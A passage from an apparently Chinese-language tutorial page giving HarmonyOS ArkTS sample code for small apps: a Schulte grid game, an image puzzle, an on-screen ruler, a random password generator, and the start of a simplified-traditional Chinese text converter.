.backgroundColor(Color.Orange) .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;); &#125;&#125; // 方块类@ObservedV2class Cell &#123; // 方块所在的行 row: number; // 方块所在的列 column: number; // 是否有地雷 hasMine: boolean = false; // 周围地雷数量 neighborMines: number = 0; // 是否被标记为地雷 @Trace isFlag: boolean = false; // 方块值 @Trace value: string; // 构造函数 constructor(row: number, column: number) &#123; this.row = row; this.column = column; this.value = &#x27;&#x27;; &#125;&#125; Schrulte Grid舒尔特方格（Schrulte Grid），也被称为舒尔特表或舒尔特图表，是一种用于训练注意力、视觉搜索速度和广度的简单而有效的工具。它通常由一个5x5的方格组成，每个小格子里随机填写了1到25的数字。训练者需要尽快地按照数字顺序找出这些数字，并用手指指出或说出它们的位置。 这种练习可以帮助提高眼睛的移动速度、扩大视野范围、增强大脑的反应速度和专注力，因此常被用来作为儿童和成人的注意力训练方法之一。此外，它也被一些专业领域（如飞行员、运动员等）用来提升快速信息处理能力和决策效率。 进行舒尔特方格训练时，建议： 保持正确的姿势，确保光线充足。眼睛与纸面保持适当距离，一般为30-40厘米。尽量不要用手指直接指着数字，以锻炼眼睛的移动能力。随着熟练程度的提高，可以尝试更复杂或更大的方格，比如6x6或7x7。定期练习，但也要注意休息，避免过度疲劳。舒尔特方格不仅是一个简单的游戏，也是一个实用的认知训练工具，对于改善注意力集中度和个人效率有着积极的作用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; @Entry@Componentstruct Index &#123; @State numbers: number[] = []; @State currentIndex: number = 0; //用于判断用户点击是否正确 @State timeStart: number = 0; @State widthItem: number = 120 @State marginItem: number = 5 // 初始化舒尔特方格 initGrid() &#123; this.numbers = [] for (let i = 0; i &lt; 25; i++) &#123; this.numbers.push(i + 1) &#125; this.shuffleArray(JSON.parse(JSON.stringify(this.numbers))); this.currentIndex = 0; this.timeStart = Date.now() &#125; // 随机打乱数组 shuffleArray(array: number[]) &#123; for (let i = array.length - 1; i &gt; 0; i--) &#123; const j = Math.floor(Math.random() * 25); let temp = array[i] array[i] = array[j] array[j] = temp &#125; this.numbers = array &#125; // 判断是否完成 isCompleted() &#123; return this.currentIndex === 25; &#125; build() &#123; Column(&#123; space: 20 &#125;) &#123; Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.numbers, (item: number, index: number) =&gt; &#123; Text(`$&#123;item&#125;`) .width(`$&#123;this.widthItem&#125;lpx`) .height(`$&#123;this.widthItem&#125;lpx`) .margin(`$&#123;this.marginItem&#125;lpx`) .fontSize(`$&#123;this.widthItem/2&#125;lpx`) .textAlign(TextAlign.Center) .backgroundColor(Color.Orange) .fontColor(Color.White) .borderRadius(5) .visibility(item &lt;= this.currentIndex ? Visibility.Hidden : Visibility.Visible) .onClick(() =&gt; &#123; if (this.numbers[index] === this.currentIndex + 1) &#123; this.currentIndex++; if (this.isCompleted()) &#123; console.info(&#x27;完成！&#x27;); promptAction.showDialog(&#123; title: `用时`, message: `$&#123;((Date.now() - this.timeStart) / 1000).toFixed(3)&#125;秒`, buttons: [ &#123; text: &#x27;重新开始&#x27;, color: &#x27;#ffa500&#x27; &#125; ], &#125;).then(()=&gt;&#123; this.initGrid(); &#125;) &#125; &#125; else &#123; console.info(&#x27;错误的顺序！&#x27;); &#125; &#125;) &#125;) &#125; .width(`$&#123;(this.widthItem + this.marginItem * 2) * 5&#125;lpx`) .height(`$&#123;(this.widthItem + this.marginItem * 2) * 5&#125;lpx`) // 开始按钮 Button(&#x27;开始&#x27;) .width(&#x27;50%&#x27;) .height(&#x27;10%&#x27;) .onClick(() =&gt; &#123; this.initGrid(); console.info(&#x27;游戏开始&#x27;); &#125;); &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) &#125;&#125; Piece拼图 算法： 随机 剪裁 交换 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186import &#123; fileIo as fs &#125; from &#x27;@kit.CoreFileKit&#x27;;import &#123; common &#125; from &#x27;@kit.AbilityKit&#x27;;import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;;import &#123; image &#125; from &#x27;@kit.ImageKit&#x27;;import &#123; photoAccessHelper &#125; from &#x27;@kit.MediaLibraryKit&#x27;; // 定义拼图组件接口interface PuzzlePiece &#123; // 拼图块的像素地图 pixelMap: image.PixelMap; // 原始图片中的索引位置 originalIndex: number;&#125; // 使用装饰器定义页面组件@Entry@Componentstruct Page30 &#123; // 状态变量：选中图片的URI @State selectedImageUrl: string = &#x27;&#x27;; // 状态变量：原始图片的URI @State originalImageUrl: string = &#x27;&#x27;; // 状态变量：存储拼图块的数组 @State puzzlePieces: Array&lt;PuzzlePiece&gt; = []; // 状态变量：记录当前选中的拼图块索引 @State selectedPiece: number = -1; // 弹出图片选择器方法 async openPicker() &#123; try &#123; let PhotoSelectOptions = new photoAccessHelper.PhotoSelectOptions(); PhotoSelectOptions.MIMEType = photoAccessHelper.PhotoViewMIMETypes.IMAGE_TYPE; PhotoSelectOptions.maxSelectNumber = 1; let photoPicker = new photoAccessHelper.PhotoViewPicker(); let uris: photoAccessHelper.PhotoSelectResult = await photoPicker.select(PhotoSelectOptions) if (!uris || uris.photoUris.length === 0) return; // 获取选中图片的第一张URI let uri: string = uris.photoUris[0]; // 打开文件读取流 let file = fs.openSync(uri, fs.OpenMode.READ_ONLY); // 获取当前上下文 let context = getContext(this) as common.UIAbilityContext; // 新建一个保存裁剪后图片的路径 let newUrl = context.filesDir + &#x27;/test&#x27; + new Date().getTime() + &#x27;.jpg&#x27;; // 复制图片到新的路径 fs.copyFileSync(file.fd, newUrl); // 关闭文件读取流 fs.closeSync(file); // 更新状态变量：设置显示图片的URI this.selectedImageUrl = newUrl; // 更新状态变量：保存原始图片的URI this.originalImageUrl = uri; // 图片更改时触发的方法 this.imgChange(); &#125; catch (e) &#123; console.error(&#x27;openPicker&#x27;, JSON.stringify(e)); &#125; &#125; // 图片更改处理方法 async imgChange() &#123; try &#123; // 创建图片源对象 const imageSource: image.ImageSource = image.createImageSource(this.selectedImageUrl); // 图片解码选项 let decodingOptions: image.DecodingOptions = &#123; editable: true, desiredPixelFormat: 3, &#125;; // 创建像素地图 let mPixelMap: image.PixelMap = await imageSource.createPixelMap(decodingOptions); // 获取图片信息 let mImageInfo: image.ImageInfo = await mPixelMap.getImageInfo(); // 计算每个拼图块的大小 const pieceSize: image.Size = &#123; width: mImageInfo.size.width / 3, height: mImageInfo.size.height / 3, &#125;; // 清空已有拼图块数据 this.puzzlePieces.splice(0); // 遍历图片生成9个拼图块 let count = 0; for (let row = 0; row &lt; 3; row++) &#123; for (let col = 0; col &lt; 3; col++) &#123; // 创建基于原图的新图片源 const imageSource = image.createImageSource(this.selectedImageUrl); // 创建新像素地图 let mPixelMap = await imageSource.createPixelMap(decodingOptions); // 计算裁剪区域 const cutRegion: image.Region = &#123; x: col * pieceSize.width, y: row * pieceSize.height, size: pieceSize, &#125;; // 裁剪像素地图 await mPixelMap.crop(cutRegion); // 创建并添加拼图块至数组 const piece: PuzzlePiece = &#123; pixelMap: mPixelMap, originalIndex: count++, &#125;; this.puzzlePieces.push(piece); &#125; &#125; // 打乱拼图块顺序 for (let i = this.puzzlePieces.length - 1; i &gt; 0; i--) &#123; const j = Math.floor(Math.random() * (i + 1)); let temp: PuzzlePiece = this.puzzlePieces[i]; this.puzzlePieces[i] = this.puzzlePieces[j]; this.puzzlePieces[j] = temp; &#125; &#125; catch (e) &#123; console.error(&#x27;imgChange&#x27;, JSON.stringify(e)); &#125; &#125; // 构建UI界面 build() &#123; Column() &#123; // 添加选择图片按钮，点击后调用打开图片选择器方法 Button(&#x27;选择图片→&#x27;).onClick(() =&gt; &#123; this.openPicker(); &#125;); // 显示原始图片（如果已选择） if (this.originalImageUrl) &#123; Text(&#x27;原始图片↓&#x27;); Image(this.originalImageUrl) .width(&#x27;180lpx&#x27;) .height(&#x27;180lpx&#x27;) .objectFit(ImageFit.Contain); &#125; // 如果有拼图块，则显示游戏区 if (this.puzzlePieces.length &gt; 0) &#123; Text(&#x27;游戏图片↓&#x27;); // 游戏区域采用网格布局 Grid() &#123; // 遍历所有拼图块并创建网格项 ForEach(this.puzzlePieces, (item: PuzzlePiece, index: number) =&gt; &#123; GridItem() &#123; // 显示拼图块图像 Image(item.pixelMap) .width(&#x27;200lpx&#x27;) .height(&#x27;200lpx&#x27;) .margin(&#x27;5lpx&#x27;) // 根据是否选中调整缩放比例 .scale(this.selectedPiece == index ? &#123; x: 0.5, y: 0.5 &#125; : &#123; x: 1, y: 1 &#125;) // 添加点击事件处理 .onClick(() =&gt; &#123; // 处理拼图交换逻辑 if (this.selectedPiece == -1) &#123; this.selectedPiece = index; &#125; else if (this.selectedPiece == index) &#123; this.selectedPiece = -1; &#125; else &#123; let temp: PuzzlePiece = this.puzzlePieces[this.selectedPiece]; this.puzzlePieces[this.selectedPiece] = this.puzzlePieces[index]; this.puzzlePieces[index] = temp; this.selectedPiece = -1; // 检查拼图是否完成 let isSucc: boolean = true; for (let i = 0; i &lt; this.puzzlePieces.length; i++) &#123; console.info(&#x27;====item&#x27;, this.puzzlePieces[i].originalIndex, i); if (this.puzzlePieces[i].originalIndex !== i) &#123; isSucc = false; break; &#125; &#125; // 如果拼图完成，弹出提示对话框 if (isSucc) &#123; promptAction.showDialog(&#123; message: &#x27;拼图完成！&#x27;, &#125;); &#125; &#125; &#125;); &#125; &#125;) // End of ForEach &#125; // End of Grid .backgroundColor(&quot;#fafafa&quot;); // 设置网格背景色 &#125; &#125; // End of Column .width(&#x27;100%&#x27;); // 设置列宽度为100% &#125;&#125; ruler直尺 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208import &#123; window &#125; from &#x27;@kit.ArkUI&#x27;; // 导入窗口相关的APIimport &#123; deviceInfo &#125; from &#x27;@kit.BasicServicesKit&#x27;; // 导入设备信息相关的API // 定义直尺线类class RulerLine &#123; index: number; // 线的索引 height: number; // 线的高度 constructor(index: number, height: number) &#123; this.index = index; // 初始化索引 this.height = height; // 初始化高度 &#125; // 显示线的编号 showNumber(): string &#123; return this.index % 10 === 0 ? `$&#123;Math.floor(this.index / 10)&#125;` : &#x27;&#x27;; // 每10个线显示一个编号 &#125;&#125; // 扩展文本样式@Extend(Text)function fancy() &#123; .fontColor(&quot;#019dfe&quot;) // 设置字体颜色 .fontSize(20); // 设置字体大小&#125; // 定义直尺组件@Entry@Componentstruct RulerComponent &#123; @State maxRulerHeight: number = 0; // 最大直尺高度 @State @Watch(&#x27;onCellWidthChanged&#x27;) cellWidthInPixels: number = 17.28; // 每毫米对应的像素 @State textWidth: number = 80; // 文本宽度 @State rulerLines: RulerLine[] = []; // 直尺线数组 @State leftOffsetX: number = -300; // 左侧偏移 @State currentPositionX: number = -300; // 当前X位置 @State @Watch(&#x27;onContainerHeightChanged&#x27;) containerHeight: number = 53; // 容器高度 @State originalContainerHeight: number = 53; // 原始容器高度 @State @Watch(&#x27;onCellWidthChanged&#x27;) containerWidth: number = 0; // 容器宽度 // 处理单元格宽度变化 onCellWidthChanged() &#123; this.maxRulerHeight = vp2px(this.containerWidth) / this.cellWidthInPixels / 10; // 更新最大直尺高度 &#125; // 处理容器高度变化 onContainerHeightChanged() &#123; this.containerHeight = Math.max(this.containerHeight, 53); // 确保容器高度不小于53 &#125; // 组件即将出现时 aboutToAppear(): void &#123; // 设置当前应用为横屏显示 window.getLastWindow(getContext()).then((windowClass) =&gt; &#123; windowClass.setPreferredOrientation(window.Orientation.LANDSCAPE); // 设置为横屏 &#125;); // 初始化直尺线 for (let i = 0; i &lt;= 15 * 10; i++) &#123; let lineHeight: number = (i % 10 === 0) ? 90 : (i % 5 === 0) ? 60 : 45; // 根据索引设置线的高度 this.rulerLines.push(new RulerLine(i, lineHeight)); // 将新线添加到数组中 &#125; &#125; // 构建UI build() &#123; Column() &#123; // 创建一个列布局 Stack() &#123; // 创建一个堆叠布局 Stack() &#123; // 创建另一个堆叠布局 ForEach(this.rulerLines, (line: RulerLine, index: number) =&gt; &#123; // 遍历直尺线数组 Line()// 创建一条线 .width(1)// 设置线宽 .height(`$&#123;line.height&#125;px`)// 设置线高 .backgroundColor(Color.White)// 设置线的背景颜色 .margin(&#123; left: `$&#123;this.cellWidthInPixels * index&#125;px` &#125;); // 设置线的左边距 Text(line.showNumber())// 显示线的编号 .fontColor(Color.White)// 设置字体颜色 .fontSize(18)// 设置字体大小 .width(`$&#123;this.textWidth&#125;px`)// 设置文本宽度 .height(`$&#123;this.textWidth&#125;px`)// 设置文本高度 .textAlign(TextAlign.Center)// 设置文本对齐方式 .margin(&#123; left: `$&#123;this.cellWidthInPixels * index - this.textWidth / 2&#125;px`, top: `$&#123;line.height&#125;px` &#125;); // 设置文本位置 &#125;); &#125;.width(&#x27;100%&#x27;).height(&#x27;100%&#x27;).align(Alignment.TopStart); // 设置堆叠布局的宽高和对齐方式 Column(&#123; space: 15 &#125;) &#123; // 创建一个列布局，设置间距 Text(`当前设备：$&#123;deviceInfo.marketName&#125;`).fancy(); // 显示当前设备名称 Counter() &#123; // 创建一个计数器 Text(`选中区距离：$&#123;this.maxRulerHeight.toFixed(2)&#125;厘米`).fancy(); // 显示选中区距离 &#125; .foregroundColor(Color.White) // 设置计数器字体颜色 .width(300) // 设置计数器宽度 .onInc(() =&gt; &#123; // 增加计数器时的处理 this.containerHeight = px2vp(vp2px(this.containerHeight) + this.cellWidthInPixels / 10); // 更新容器高度 &#125;) .onDec(() =&gt; &#123; // 减少计数器时的处理 this.containerHeight = px2vp(vp2px(this.containerHeight) - this.cellWidthInPixels / 10); // 更新容器高度 &#125;); Counter() &#123; // 创建另一个计数器 Text(`每毫米间距：$&#123;this.cellWidthInPixels.toFixed(2)&#125;px`).fancy(); // 显示每毫米间距 &#125; .foregroundColor(Color.White) // 设置计数器字体颜色 .width(300) // 设置计数器宽度 .onInc(() =&gt; &#123; // 增加计数器时的处理 this.cellWidthInPixels += 0.01; // 增加每毫米间距 &#125;) .onDec(() =&gt; &#123; // 减少计数器时的处理 this.cellWidthInPixels = Math.max(0.01, this.cellWidthInPixels - 0.01); // 减少每毫米间距，确保不小于0.01 &#125;); &#125; RelativeContainer() &#123; // 创建一个相对布局容器 Rect()// 创建一个矩形 .fill(&quot;#80019dfe&quot;)// 设置填充颜色 .borderColor(&quot;#019dfe&quot;)// 设置边框颜色 .borderWidth(&#123; left: 1, right: 1 &#125;)// 设置边框宽度 .clip(true)// 启用裁剪 .width(&quot;100%&quot;)// 设置宽度为100% .height(&quot;100%&quot;)// 设置高度为100% .onAreaChange((oldArea: Area, newArea: Area) =&gt; &#123; // 处理区域变化 this.containerWidth = newArea.width as number; // 更新容器宽度 &#125;); Stack() &#123; // 创建一个堆叠布局 Circle(&#123; height: 30, width: 30 &#125;)// 创建一个圆形 .fill(&quot;#019dfe&quot;)// 设置填充颜色 .stroke(Color.Transparent)// 设置边框颜色为透明 .strokeWidth(3); // 设置边框宽度 Circle(&#123; height: 40, width: 40 &#125;)// 创建另一个圆形 .fill(Color.Transparent)// 设置填充颜色为透明 .stroke(&quot;#019dfe&quot;)// 设置边框颜色 .strokeWidth(3); // 设置边框宽度 &#125; .hitTestBehavior(HitTestMode.Block) // 设置碰撞检测行为 .padding(20) // 设置内边距 .alignRules(&#123; // 设置对齐规则 center: &#123; anchor: &quot;__container__&quot;, align: VerticalAlign.Center &#125;, // 垂直居中 middle: &#123; anchor: &quot;__container__&quot;, align: HorizontalAlign.Start &#125; // 左对齐 &#125;) .gesture(PanGesture(&#123; // 左侧拖动手势 fingers: 1, // 单指拖动 direction: PanDirection.Horizontal, // 水平拖动 distance: 1 // 最小拖动距离 &#125;).onActionUpdate((event: GestureEvent) =&gt; &#123; // 拖动更新时的处理 this.leftOffsetX = this.currentPositionX + event.offsetX / 2; // 更新左侧偏移 this.containerHeight = this.originalContainerHeight - event.offsetX; // 更新容器高度 &#125;).onActionEnd(() =&gt; &#123; // 拖动结束时的处理 this.currentPositionX = this.leftOffsetX; // 更新位置 this.originalContainerHeight = this.containerHeight; // 更新原始高度 &#125;)); Stack() &#123; // 创建另一个堆叠布局 Circle(&#123; height: 30, width: 30 &#125;)// 创建一个圆形 .fill(&quot;#019dfe&quot;)// 设置填充颜色 .stroke(Color.Transparent)// 设置边框颜色为透明 .strokeWidth(3); // 设置边框宽度 Circle(&#123; height: 40, width: 40 &#125;)// 创建另一个圆 .fill(Color.Transparent)// 设置填充颜色为透明 .stroke(&quot;#019dfe&quot;)// 设置边框颜色 .strokeWidth(3); // 设置边框宽度 &#125; .hitTestBehavior(HitTestMode.Block) // 设置碰撞检测行为 .padding(20) // 设置内边距 .alignRules(&#123; // 设置对齐规则 center: &#123; anchor: &quot;__container__&quot;, align: VerticalAlign.Center &#125;, // 垂直居中 middle: &#123; anchor: &quot;__container__&quot;, align: HorizontalAlign.End &#125; // 右对齐 &#125;) .gesture(PanGesture(&#123; // 右侧拖动手势 fingers: 1, // 单指拖动 direction: PanDirection.Horizontal, // 水平拖动 distance: 1 // 最小拖动距离 &#125;).onActionUpdate((event: GestureEvent) =&gt; &#123; // 拖动更新时的处理 this.leftOffsetX = this.currentPositionX + event.offsetX / 2; // 更新左侧偏移 this.containerHeight = this.originalContainerHeight + event.offsetX; // 更新容器高度 &#125;).onActionEnd(() =&gt; &#123; // 拖动结束时的处理 this.currentPositionX = this.leftOffsetX; // 更新位置 this.originalContainerHeight = this.containerHeight; // 更新原始高度 &#125;)); &#125; .width(this.containerHeight) // 设置宽度 .height(&quot;100%&quot;) // 设置高度 .translate(&#123; x: this.leftOffsetX &#125;) // 使用左侧偏移 .gesture(PanGesture(&#123; // 左侧拖动手势 fingers: 1, // 单指拖动 direction: PanDirection.Horizontal, // 水平拖动 distance: 1 // 最小拖动距离 &#125;).onActionUpdate((event: GestureEvent) =&gt; &#123; // 拖动更新时的处理 if (event) &#123; this.leftOffsetX = this.currentPositionX + event.offsetX; // 更新左侧偏移 &#125; &#125;).onActionEnd(() =&gt; &#123; // 拖动结束时的处理 this.currentPositionX = this.leftOffsetX; // 更新位置 &#125;)); &#125; &#125;.height(&#x27;100%&#x27;).width(&#x27;100%&#x27;) // 设置高度和宽度 .padding(&#123; left: 30, right: 10 &#125;) // 设置内边距 .backgroundColor(&quot;#181b22&quot;); // 设置背景颜色 &#125;&#125; randon password随机密码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263// 导入剪贴板服务import &#123; pasteboard &#125; from &#x27;@kit.BasicServicesKit&#x27;;// 导入弹窗提示服务import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; // 使用装饰器定义一个可观察的类，用于密码选项@ObservedV2class PasswordOption &#123; name: string; // 选项名称 characters: string; // 该选项对应的字符集 // 定义是否选中，默认为true @Trace selected: boolean = true; // 定义是否启用，默认为true @Trace enabled: boolean = true; // 构造函数，初始化name和characters constructor(name: string, characters: string) &#123; this.name = name; this.characters = characters; &#125;&#125; // 使用装饰器定义一个入口组件@Entry@Componentstruct PasswordGeneratorPage &#123; // 定义密码选项数组 @State options: PasswordOption[] = [ new PasswordOption(&quot;大写字母&quot;, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;), new PasswordOption(&quot;小写字母&quot;, &quot;abcdefghijklmnopqrstuvwxyz&quot;), new PasswordOption(&quot;数字&quot;, &quot;0123456789&quot;), new PasswordOption(&quot;特殊字符&quot;, &quot;!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?&quot;), ]; // 定义密码长度状态，默认值为10 @State passwordLength: number = 10; // 基础间距 @State baseSpacing: number = 30; // 生成的密码 @State generatedPassword: string = &#x27;&#x27;; // 是否启用复制按钮 @State isCopyButtonEnabled: boolean = false; // 主题色 @State primaryColor: string = &#x27;#71dec7&#x27;; // 字体颜色 @State fontColor: string = &quot;#2e2e2e&quot;; // 生成密码的方法 generatePassword() &#123; let characterSet = &#x27;&#x27;; // 初始化字符集合 // 遍历所有选项，如果选项被选中则加入字符集合 for (let option of this.options) &#123; if (option.selected) &#123; characterSet += option.characters &#125; &#125; let password = &#x27;&#x27;; // 初始化密码字符串 // 根据密码长度生成随机密码 for (let i = 0; i &lt; this.passwordLength; i++) &#123; const randomIndex = Math.floor(Math.random() * characterSet.length); password += characterSet[randomIndex]; &#125; this.generatedPassword = password; // 更新生成的密码 &#125; // 复制到剪贴板的方法 copyToClipboard(text: string) &#123; const pasteboardData = pasteboard.createData(pasteboard.MIMETYPE_TEXT_PLAIN, text); // 创建剪贴板数据 const systemPasteboard = pasteboard.getSystemPasteboard(); // 获取系统剪贴板 systemPasteboard.setData(pasteboardData); // 将数据放入剪切板 promptAction.showToast(&#123; message: &#x27;已复制&#x27; &#125;); // 显示复制成功的提示 &#125; // 检查选项选择状态的方法 checkOptionsSelection() &#123; let selectedCount = 0; // 记录已选中的选项数量 let lastSelectedIndex = 0; // 记录最后一个选中的选项索引 // 遍历所有选项 for (let i = 0; i &lt; this.options.length; i++) &#123; this.options[i].enabled = true; // 默认启用所有选项 if (this.options[i].selected) &#123; lastSelectedIndex = i; // 更新最后一个选中的选项索引 selectedCount++; // 增加选中计数 &#125; &#125; // 如果只有一个选项被选中，则禁用该选项防止其被取消选中 if (selectedCount === 1) &#123; this.options[lastSelectedIndex].enabled = false; &#125; &#125; // 构建页面布局的方法 build() &#123; Column() &#123; // 标题栏 Text(&quot;随机密码生成&quot;) .width(&#x27;100%&#x27;)// 设置宽度为100% .height(54)// 设置高度为54 .fontSize(18)// 设置字体大小 .fontWeight(600)// 设置字体粗细 .backgroundColor(Color.White)// 设置背景颜色 .textAlign(TextAlign.Center)// 设置文本居中对齐 .fontColor(this.fontColor); // 设置字体颜色 // 密码长度设置部分 Column() &#123; Row() &#123; Text(`密码长度：`)// 密码长度标签 .fontWeight(600) .fontSize(18) .fontColor(this.fontColor); Text(`$&#123;this.passwordLength&#125;`)// 显示当前密码长度 .fontWeight(600) .fontSize(18) .fontColor(this.primaryColor); &#125; .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx`, left: `$&#123;this.baseSpacing&#125;lpx` &#125;); // 滑动条设置密码长度 Row() &#123; Text(&#x27;4&#x27;).fontColor(this.fontColor).width(20); Slider(&#123; value: this.passwordLength, // 当前值 min: 4, // 最小值 max: 32, // 最大值 style: SliderStyle.InSet // 滑动条样式 &#125;) .layoutWeight(1)// 布局权重 .blockColor(Color.White)// 滑块颜色 .trackColor(&#x27;#EBEBEB&#x27;)// 轨道颜色 .trackThickness(30)// 轨道厚度 .blockSize(&#123; width: 55, height: 55 &#125;)// 滑块大小 .selectedColor(this.primaryColor)// 选中颜色 .onChange((value: number, mode: SliderChangeMode) =&gt; &#123; this.passwordLength = value; // 更新密码长度 console.info(&#x27;value:&#x27; + value + &#x27;mode&#x27; + mode.toString); // 打印日志 &#125;); Text(&#x27;32&#x27;).fontColor(this.fontColor).width(20); &#125;.margin(&#123; left: `$&#123;this.baseSpacing&#125;lpx`, right: `$&#123;this.baseSpacing&#125;lpx`, top: `$&#123;this.baseSpacing&#125;lpx`, &#125;); // 选项设置部分 Text(&#x27;选项&#x27;) .fontWeight(600) .fontSize(18) .fontColor(this.fontColor) .margin(&#123; left: `$&#123;this.baseSpacing&#125;lpx`, top: `$&#123;this.baseSpacing&#125;lpx`, bottom: `$&#123;this.baseSpacing&#125;lpx` &#125;); // 动态生成每个选项的UI元素 ForEach(this.options, (option: PasswordOption, index: number) =&gt; &#123; Row() &#123; Text(option.name)// 选项名称 .fontWeight(400) .fontSize(16) .fontColor(this.fontColor) .layoutWeight(1); Toggle(&#123; type: ToggleType.Switch, isOn: option.selected &#125;)// 切换按钮 .width(&#x27;100lpx&#x27;) .height(&#x27;50lpx&#x27;) .enabled(option.enabled)// 是否启用切换 .selectedColor(this.primaryColor) .onChange((isOn: boolean) =&gt; &#123; option.selected = isOn; // 更新选项状态 this.checkOptionsSelection(); // 检查选项选择状态 &#125;); &#125; .width(&#x27;100%&#x27;) .padding(&#123; left: `$&#123;this.baseSpacing&#125;lpx`, right: `$&#123;this.baseSpacing&#125;lpx`, top: `$&#123;this.baseSpacing / 3&#125;lpx`, bottom: `$&#123;this.baseSpacing / 3&#125;lpx` &#125;) .hitTestBehavior(HitTestMode.Block) .onClick(() =&gt; &#123; if (option.enabled) &#123; option.selected = !option.selected; // 切换选项状态 &#125; &#125;); &#125;); // 生成密码按钮 Text(&#x27;生成密码&#x27;) .fontColor(Color.White) .backgroundColor(this.primaryColor) .height(54) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.baseSpacing * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx`, left: `$&#123;this.baseSpacing&#125;lpx`, right: `$&#123;this.baseSpacing&#125;lpx`, bottom: `$&#123;this.baseSpacing&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;)// 点击效果 .onClick(() =&gt; &#123; this.generatePassword(); // 生成密码 &#125;); &#125; .width(&#x27;650lpx&#x27;) .margin(&#123; top: 20 &#125;) .backgroundColor(Color.White) .borderRadius(10) .alignItems(HorizontalAlign.Start); // 显示生成的密码 Column() &#123; Text(`密码结果：`) .fontWeight(600) .fontSize(18) .fontColor(this.fontColor) .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx`, left: `$&#123;this.baseSpacing&#125;lpx`, &#125;); Text(`$&#123;this.generatedPassword&#125;`)// 显示生成的密码 .width(&#x27;650lpx&#x27;) .fontColor(this.primaryColor) .fontSize(18) .textAlign(TextAlign.Center) .padding(&#123; left: 5, right: 5 &#125;) .margin(&#123; top: `$&#123;this.baseSpacing / 3&#125;lpx` &#125;); // 复制按钮 Text(&#x27;复制&#x27;) .enabled(this.generatedPassword ? true : false)// 只有生成了密码才启用复制按钮 .fontColor(Color.White) .backgroundColor(this.primaryColor) .height(54) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.baseSpacing * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx`, left: `$&#123;this.baseSpacing&#125;lpx`, right: `$&#123;this.baseSpacing&#125;lpx`, bottom: `$&#123;this.baseSpacing&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;) .onClick(() =&gt; &#123; this.copyToClipboard(this.generatedPassword); // 复制密码 &#125;); &#125; .width(&#x27;650lpx&#x27;) .backgroundColor(Color.White) .borderRadius(10) .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx` &#125;) .alignItems(HorizontalAlign.Start); &#125; .height(&#x27;100%&#x27;) .width(&#x27;100%&#x27;) .backgroundColor(&quot;#f2f3f5&quot;); // 页面背景颜色 &#125;&#125; chineseohpm install @nutpi&#x2F;chinese_transverter 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191// 导入必要的转换库，提供简体与繁体之间的转换功能import &#123; transverter, TransverterType, TransverterLanguage &#125; from &quot;@nutpi/chinese_transverter&quot;;// 导入剪贴板服务，用于将文本复制到系统剪贴板import &#123; pasteboard &#125; from &#x27;@kit.BasicServicesKit&#x27;;// 导入提示服务，用于向用户显示消息import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; // 使用@Entry装饰器标记此组件为应用的入口点@Entry // 使用@Component装饰器定义一个名为SimplifiedTraditionalConverter的组件@Componentstruct SimplifiedTraditionalConverter &#123; // 定义状态变量inputText，存储用户输入的原始文本，当其值变化时触发onInputTextChanged方法 @State @Watch(&#x27;onInputTextChanged&#x27;) inputText: string = &#x27;&#x27;; // 定义状态变量simplifiedResult，存储转换后的简体结果 @State simplifiedResult: string = &#x27;&#x27;; // 定义状态变量traditionalResult，存储转换后的繁体结果 @State traditionalResult: string = &#x27;&#x27;; // 定义状态变量isInputFocused，表示输入框是否获得了焦点 @State isInputFocused: boolean = false; // 定义主题颜色 @State private themeColor: string = &#x27;#439fff&#x27;; // 定义文本颜色 @State private textColor: string = &quot;#2e2e2e&quot;; // 定义基础内边距大小 @State private basePadding: number = 30; // 定义最小文本区域高度 @State private minTextAreaHeight: number = 50; // 定义最大文本区域高度 @State private maxTextAreaHeight: number = 300; // 当inputText状态改变时触发的方法，用于更新转换结果 onInputTextChanged() &#123; // 将inputText转换为简体，并更新simplifiedResult this.simplifiedResult = transverter(&#123; type: TransverterType.SIMPLIFIED, str: this.inputText, language: 